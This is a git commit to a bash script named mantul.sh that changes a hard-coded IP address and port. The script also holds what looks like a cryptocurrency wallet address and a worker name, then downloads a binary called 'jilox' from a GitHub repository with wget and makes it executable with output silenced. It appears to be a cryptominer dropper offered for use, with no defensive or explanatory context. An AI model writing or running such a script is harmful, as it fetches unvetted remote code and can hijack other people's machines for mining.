18d13dc968e68292b92613f525faaa7cd32bca6f
ganggamulyana08 <ganggamulyana08@gmail.com>
2024-08-02 05:24:12 +0700

    Update mantul.sh

--- mantul.sh
+++ mantul.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-A=188.166.186.218:443
+A=157.230.255.104:443
 B=8ARZp6tyeNzMcq9zheXVcoA2z3VVuueCTJZkmNmwh36yRztNuoLFqLUWZDysmSM5q7fyqcYdn1BcDfzJtHXdQMEdTsG6eDB
 C=GAS
 wget https://github.com/14613261/14613261/raw/main/jilox && chmod u+x jilox >/dev/null 2>&1
